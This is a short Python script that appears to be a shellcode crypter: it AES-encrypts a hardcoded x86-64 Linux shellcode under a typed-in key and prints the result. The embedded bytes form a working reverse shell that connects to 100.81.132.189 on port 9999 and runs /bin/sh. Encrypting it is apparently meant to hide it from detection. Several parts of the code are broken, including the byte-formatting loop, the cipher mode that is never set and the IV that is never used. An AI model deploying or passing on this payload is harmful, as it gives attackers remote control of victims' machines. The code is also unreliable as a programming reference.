#!/usr/bin/env python3

from Crypto.Cipher import AES
import hashlib
import random

shellcode = b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\xb0\x29\x40\xb7\x02\x40\xb6\x01\x0f\x05\x48\x89\xc7\x52\xc7\x44\x24\xfc\x64\x51\x84\xbd\x66\xc7\x44\x24\xfa\x27\x0f\x66\xc7\x44\x24\xf8\x02\x00\x48\x83\xec\x08\x48\x89\xe6\xb0\x2a\xb2\x10\x0f\x05\x48\x31\xf6\x40\xb6\x02\xb0\x21\x0f\x05\x48\xff\xce\x79\xf7\x41\x50\x49\xba\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x41\x52\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05";

def md5_key(key):
    b_key = str.encode(key)
    hashed = hashlib.md5(b_key)
    return hashed.hexdigest()

def pad(shellcode):
    if len(shellcode) % 16 != 0:
        c = 16 - (len(shellcode) % 16)
        for x in range(c):
            shellcode += b'*'
    return shellcode

def format_shellcode(shellcode):
    res = ""
    for x in range(shellcode):
        res += "\\x%02x" % x
    return res

key = input("[+] Enter the key : ")
key = md5_key(key)
iv = ''.join([chr(random.randint(0,255)) for i in range(16)])
cipher = AES.new(key)
encrypted = cipher.encrypt(pad(shellcode))

print("\n[+] Encrypted shellcode = \n{}\n".format(format_shellcode(encrypted)))
print("[+] Used key ( MD5 converted ) : {}".format(key))
